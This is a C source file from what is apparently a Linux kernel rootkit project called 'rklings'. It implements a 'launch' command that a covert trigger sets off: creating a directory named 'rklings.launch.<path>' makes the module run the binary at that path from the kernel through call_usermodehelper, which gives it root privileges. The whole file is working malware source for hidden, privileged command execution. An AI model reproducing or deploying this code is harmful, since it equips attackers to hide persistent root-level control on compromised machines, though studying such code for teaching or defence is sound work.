// SPDX-License-Identifier: GPL-2.0
//
// Launch a userspace binary from the kernel using call_usermodehelper.
// The mkdir command "rklings.launch.<path>" passes the absolute path
// as the arg parameter.
//
#include "rootkit.h"
#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

struct launch_work {
	struct work_struct work;
	char path[];
};

static void launch_worker(struct work_struct *work)
{
	struct launch_work *launch = container_of(work, struct launch_work, work);
	char *argv[] = { launch->path, NULL };
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL,
	};
	int ret;

	ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	pr_info("rklings: launch: %s (ret=%d)\n", launch->path, ret);
	kfree(launch);
	module_put(THIS_MODULE);
}

static int cmd_launch(const char *arg)
{
	struct launch_work *launch;
	size_t path_len;

	if (!arg || arg[0] != '/')
		return -EINVAL;

	path_len = strlen(arg) + 1;
	launch = kmalloc(sizeof(*launch) + path_len, GFP_ATOMIC);
	if (!launch)
		return -ENOMEM;

	memcpy(launch->path, arg, path_len);
	INIT_WORK(&launch->work, launch_worker);
	if (!try_module_get(THIS_MODULE)) {
		kfree(launch);
		return -ENODEV;
	}
	if (!schedule_work(&launch->work)) {
		module_put(THIS_MODULE);
		kfree(launch);
		return -EBUSY;
	}

	return 0;
}

int rk_launch_init(void)
{
	return rk_cmd_register("launch", cmd_launch);
}
